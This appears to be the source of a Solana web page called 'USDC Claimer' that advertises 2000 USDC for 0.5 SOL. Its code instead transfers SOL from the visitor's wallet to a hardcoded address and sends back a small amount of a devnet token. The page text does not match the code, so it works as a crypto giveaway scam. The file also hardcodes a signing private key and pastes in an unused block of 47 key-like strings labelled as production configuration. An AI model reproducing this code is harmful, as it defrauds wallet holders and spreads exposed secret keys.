/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3bJmMGx4aWVsYD5KE5wZp8Vy6CHhfAd3cS8boAquot1wQe4SD1YgLsqwW1eLkM7ApSB3VjcLF89UMuW1LfZFoptt"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5toLLj8aeRiXV2SwpN3qgFaumJH81iURjSB7VUfxEvFprhStad2aVsRx9ZdA7uxk3DLvfeq5wayinijxhN2Gy2f2",
  "key1": "uYKq2ftR2d56j3ii6XENARQmViUgbRYaTz8yGHFrD9zXhEWReJV6p5n2e2HVD7dfaKy9PZb4YcggXPDuG17TE1J",
  "key2": "5TExeq4p7xAXnWYyoXywLujAvqqW7JXNakh2KGcquYRim92LT5RRwef9xG99S21Z3mDPQe7FuMRDguXLD2b3tUNU",
  "key3": "2egZ7sHmhgVyMjvtkNtUMSoFuKm7HKu5eJZqZ1Z6GF5gu2qZkQcH6kGt2jFEht5sm8idRntCtKw9AnPTiK8u8Qp",
  "key4": "3Kh5x1KR4vM64iUVxdXkYswp8zb4MJ5HRFJfQLnT8XwfDaTReJXdghkD4BcXTHvrGQLb8xXMWs4sUkT5AbY8EXAi",
  "key5": "4jcVHZBuH46svhu5DWUJ2rrXgcA2RwyKeCSJTJMrhCtnK4FybNq1Lcw9sWJXJEfvP9JY76PX2bmeCz2irpEbSQMo",
  "key6": "42o94paKE8HkKRhdGfRvdKdEzEpJyJkkREKN47Gh8RoH1SE8XJ7tMoDLMauFw7v7BfCg7ZNpjeKT8dkTMYkuVtBg",
  "key7": "5cRNqcbMxiKYMTZjFGFpiDBnu5hFDYCBaEX8jZqwngXSrgdsahbtvxYdGDU5ta2jftb7b1EqC6HTREsyZxJ8B77t",
  "key8": "3NL6yxJoUzMjFYk5L2M5vHPS1yjcbpeLk967ThGgAZh6a7apSuAsQmxWhZMa5RYkQViEMeahLpwpcKK29uziQYe",
  "key9": "33rntDLPUxhyU5h9zCo1LfpvDJGS3hDA8Qc7evBYzJmE5ZBMwGkht91DuW51Ci1d7qjk3VfZ6h2HEFkpuZH8UkGy",
  "key10": "58PGoyP8baHPmQkr2aRSTzEQeSb2n2N2F1RfjB98Z1MX8P7kG41M1q6WpRnm1KY7swfqm9jQrdEBHqjkLZfSu1y9",
  "key11": "2bSWpyA7iX7XxWWvebrt8bjsVokbwFitk7B9cshh9M2AzoyNqV4m4XFHijo9F56zgBLnxL4stzb7hTUWBPAEU183",
  "key12": "44EyP5YtrxuwB7XaKMXwnr6fSVzHjXKzyoUcWJ5FJJWT8tE37ogU4cJWp51Puf5ASntQ1RLXGeUcNJNc9E8n4Zh3",
  "key13": "uwqVQDRDmFKdLhpnA1JrGZkHQdLjoUzikwXo99rkK3EgYnwiWBUBA5azbmsVzKnPzujT7wRGrnbDScrYHnNwKMc",
  "key14": "5YCSLq5Ztjwbnuu8kguSFouX8ETrC63hQu5kinJMS7M54fYeyx6EPhYkdyAtHgR9BD2V7KYTh8pG2BAQtZQjkaq7",
  "key15": "2BtaUZ2VuYDGHNDFDhjRm737Q8sspW6aCFBCCYHuwaSZPS4pGrsWJvUW4tCX9zxhNfynYUQgJZBo6wPNUQ8eebdU",
  "key16": "SkumkM7jCFP8nCqxjBzPEa1FfmVLw4ZZXUPZ9DgbVKU99zqBm8EYrcGemWKJPZWZGz4pAGc3YKGcKREdn88JPcU",
  "key17": "5JYvFTvQRyGxsA22SdrDhZeTESmVfDkEqzpTujuc5KkDma3YDimWgJjHwsWKHqURUw5ASBzw484UUDRGtoqdqDDE",
  "key18": "3CbTDRjE3uzEP2BgNdyMCH3L7qHjZDttbAdhKWNx8WPT4vEj3wFgmtHhU9JueVXnBRpk3fGQmPWT1tZMAvkJFtC1",
  "key19": "5W9mNiAFR9ri7tvcwDChfFZcdBMGVajHAqzZFcG7sLaiQE68yWbEDXSmEErAgw8GoqqQ3kykXuHeFx6ATUmwEFZM",
  "key20": "wwGDAc3k2SUB7cqdD6BXhjWn5uMctyArXCRTrnLnvwotYgsSzv5SmUixwZCQFdVNQzADmBX1rhBySBuGnzBXMwE",
  "key21": "kmXMo7z3BQTmAKG4ta9gcfvBVsuoAAMchb2VVDnA8GHWrJxgQYA4weUfMnF8vzdB61EtZEwnYYy3NVeZk6Kg4N7",
  "key22": "4SsbMj7wTwPNGoGvR1q764T4z7NCPzFdQgWekQa9K3iicvvg8ufFM1WcbVumHnTsAKMwg5CdEifE423rL9VJkWtu",
  "key23": "4Lub5M4HfMFxRjtD9GSF9LB6UtNVWfqTgMup9dxxRwk18yMm7aX4SVvZ7v78GjPQumgTdVZF2TJyaFEpEC1mAmSM",
  "key24": "2hEFrKJixWir8CoShSCzfqdw6VRQqvourvV9Xo9MW9gTBLEy9pnXBzZCA5ffCHiFJQLi87DgZV6qfnWzGdjRCKop",
  "key25": "2FdZAAAEVGQhSG3qE2ET4MRavRVMkoXh7DfVmA2fzV1ddB34vHfJ8HneonbxADegY2NmGFLDSJZayBKAKzhNqezG",
  "key26": "3WFuQWmUcrSfAoeEQz6Ay8nmBxrMnc22k7dWT5pEB4pE8fmggTPiCWgz5F93wZt78Dnio2ZKnetfgcDD1hZ4KC1X",
  "key27": "3smRemBrzJwkry2kKVyCZ64rrFr1wo39BsmNgwiRQ8NSeasLDx1uLykNobo1QdjMEtL1nvB4UQchocaper7e7Rne",
  "key28": "3TopSUwgfTjmvmkSCwzUaRcRYUq792AsmCAXuvGWayKxU8VLUk5cT94qqwY4R1igmRu98hzRo4vwCoUWuAAikjXA",
  "key29": "2esFszpDsw26MzYfLbhutT8J3v5Yk8Lwhf7wEMTJaHwfkg5YUqUb1CK9aDxoPVgUo3BqHJCG2B1pv8tj95npb9pk",
  "key30": "5kJdDRPKZmpaxdz5dth4wWiVgh2o5af3ybSso1r4TFdbDqE94zb8hUX8Qz47GkeZazcKc5R3QDaRinRSpbFhrjnZ",
  "key31": "5DBDpCUym8owje2U1Cj3rVVnPL3Xmq8d78XK6UBxdHvo8reG7mxFZkdRSNUrxxoCzU9weLRuy29rP2CHkESxnid3",
  "key32": "5HbRd6BBmeUre3PH4VugdwYd9ZLkLA7mSUcSTj6q1nqxAVTEWDq1LuchdaGb2syahCaXTSJitnsePkM8KrkZLxrf",
  "key33": "5PBjVnt7rmPgQv3A9sxiqFk45ZZ3kUxgdRhMg4AextEQRn5KMDUrvinR2r5DcNSKLSraV64r3GEVC8Jbv3HmLXrJ",
  "key34": "2P9c44LJie6neEThQ91zRqRRgzfKpcZjiS6mSezbsF6yd9rxv5xXULqx7vHfxL5XBU3t6vAJG53gFYWjYDL6ujHz",
  "key35": "3szycSAKwRZnRQmcnRpMfotzWdzxhTvYx7zJfkNDD73DK7FRY11xLXV9nUKd4mLahojbj1DiqDCNTRYCLy4fx83e",
  "key36": "5atfRZuXf1qQrgAqFUPS5SvxYhXmcpstfcWk6tb2oprWthJCFCfij5G9XrrKguUQirEovSnALRGgmgxkEsfr9c7A",
  "key37": "4c7uTDfTeFqdfZmjS46NHXMT5KRD8XffzQQ4JSKJW47Mkt9fU2CBNJbFHZh1MXBYVjS76P85CsGN3Sus6NQsuyR4",
  "key38": "3o9PkwscBmW1n33bX6pWJ4QXVD81W2gyjb9F156h7vKvgV48TZcrxpnURkT7jdttkfsUzHZxHTigqQbd5X5Eyixa",
  "key39": "4T1JzzV4xxLY4P198kAYb6j3bijjum7qS59rSUtpJBQoP7mErsrZFbBdvgrxrA7ntA93V7ZebJULrioScHuh4hmx",
  "key40": "3QUpLzqszBPx4C52sWA9p949ZcwnSo8r7RF4AKxoYix475vccs63GUjVTwB6nTF1akJSgoKzRfBWiFEUd5ynN11s",
  "key41": "5zgXXtxetoJC1mzbqHfnD22Ef1tVF9Fx2brFz3MTXyZ4XUEASqjhjUvRrXE1F8KfMPnjjzEK42Rv9v8gfj7L7pGo",
  "key42": "4rtKFLppw47jtKxVy4w6qznZLZnbDq5RVkk8zx1jGfL1ykHo5dvvKNqTEsXXWE86tUKYZRFSA3j5PQxvtHzneQD3",
  "key43": "3sNKHv3Ehtr4c3MT712MBKiBkaUUyQFUGL8vC6nJsm1TEvnVupomrDWu3ppBgUWbmYcYeVvcL2CcuRfayEghpR8o",
  "key44": "3NVHfovvD467so1mMkQVu2BYNNXwWKpW78W4GfLCshRn9EoTRMAoeRMVYmDRJMRnWJix9XZkcqkohZQfzRcJUFGJ",
  "key45": "qfbGQsFjwwCymF9xGrgB338x2uSfBt1DFjJGfW2cM1GfMxtsETHmgEFF6j8AQGqBw4ixPgEJjUxsEPZ3sNepEsf",
  "key46": "2fisdxo1ENSKF5Dwx2BLsm54wNhKeHm2RTirrfxwZBNQ56GeCMrxmLxzZf87iuf4rP6it3SvKgVyT1FhzGdhD9TY"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
